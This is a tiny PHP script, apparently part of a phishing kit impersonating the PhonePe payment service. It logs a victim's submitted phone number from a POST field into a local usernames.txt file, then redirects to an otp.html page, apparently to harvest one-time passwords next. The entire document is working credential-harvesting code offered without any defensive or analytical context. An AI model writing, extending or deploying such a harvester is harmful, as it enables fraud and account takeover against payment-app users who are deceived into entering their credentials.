<?php

file_put_contents("usernames.txt", "Phonepay phone number : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
